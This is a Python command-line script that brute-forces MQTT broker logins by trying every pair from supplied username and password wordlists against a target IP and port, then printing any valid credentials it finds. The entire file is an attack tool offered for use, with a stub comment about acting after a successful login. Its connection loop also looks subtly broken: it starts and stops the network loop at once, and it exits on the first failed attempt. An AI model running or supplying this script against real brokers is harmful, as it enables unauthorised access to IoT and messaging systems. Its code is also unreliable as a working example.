#!/usr/bin/env python3
import argparse
from termcolor import colored
import paho.mqtt.client as mqtt

valid_credentials_found = False

def on_connect(client, userdata, flags, rc):
    global valid_credentials_found
    if rc == 0:
        valid_credentials_found = True
        print(colored(f"Valid credentials found: {client._username}:{client._password}", "green"))
        # Do something here after successful login
        client.disconnect()
    else:
        print("Failed to connect with MQTT broker. Error code:", rc)
        exit(1)

def brute_force_mqtt(ip, port, username_file, password_file):
    global valid_credentials_found
    with open(username_file, 'r') as user_file:
        usernames = user_file.read().splitlines()
    with open(password_file, 'r') as pass_file:
        passwords = pass_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            client = mqtt.Client()
            client.username_pw_set(username, password)
            client.on_connect = on_connect

            client.connect(ip, port)
            client.loop_start()
            client.loop_stop()

            if valid_credentials_found:
                return  # Stop testing once successful login is found

    print("No valid credentials found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT Brute-Force Script")
    parser.add_argument("-i", "--ip", required=True, help="MQTT server IP")
    parser.add_argument("-p", "--port", type=int, required=True, help="MQTT server port")
    parser.add_argument("-u", "--userfile", required=True, help="Username list file path")
    parser.add_argument("-pw", "--passfile", required=True, help="Password list file path")
    args = parser.parse_args()

    brute_force_mqtt(args.ip, args.port, args.userfile, args.passfile)
